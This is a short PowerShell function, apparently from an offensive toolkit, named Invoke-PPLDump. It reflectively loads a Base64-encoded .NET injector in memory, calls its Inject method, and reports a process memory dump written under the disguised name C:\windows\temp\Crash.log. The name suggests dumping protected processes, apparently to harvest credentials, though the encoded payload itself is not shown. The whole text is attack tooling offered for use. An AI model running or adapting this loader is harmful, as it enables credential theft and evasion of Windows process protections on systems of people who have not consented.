function Invoke-PPLDump
{
    $nooutput = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($Base64PPLDumpInject))
    [PPLDumpInject.Program]::Inject("")

    if (Test-Path "C:\windows\temp\Crash.log")
    {
        Write-Host ""
        Write-Host ""
        Write-Host "Successfully created dump file as C:\windows\temp\Crash.log"
    }
}